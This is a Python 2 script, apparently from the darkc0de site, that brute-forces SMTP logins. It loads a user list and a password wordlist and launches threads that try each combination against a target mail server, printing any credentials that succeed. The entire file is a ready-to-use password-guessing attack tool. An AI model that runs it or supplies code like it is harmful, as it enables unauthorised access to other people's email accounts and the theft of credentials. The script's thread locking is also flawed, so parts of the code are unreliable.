#!usr/bin/python
#Smtp Brute Forcer
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, smtplib, socket
from smtplib import SMTP
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./smtpbrute.py <server> <userlist> <wordlist>"
	sys.exit(1)
try:	
	helo = smtplib.SMTP(sys.argv[1])
	name = helo.helo()
	helo.quit()
except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException):
	name = "Server doesn't support the Helo cmd"

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n\t   d3hydr8[at]gmail[dot]com smtpBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)
print "[+] Helo message:",name,"\n"

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		print "\nReloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		try:
			print "-"*12
			print "User:",user,"Password:",value
			smtp = smtplib.SMTP(sys.argv[1])
			smtp.login(user, value)
			print "\t\nLogin successful:",user, value
			smtp.quit()
			work.join()
			sys.exit(2)
		except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), msg: 
			#print "An error occurred:", msg
			pass
 
for i in range(len(words)*len(users)):
	work = Worker()
	work.start()
	time.sleep(1)
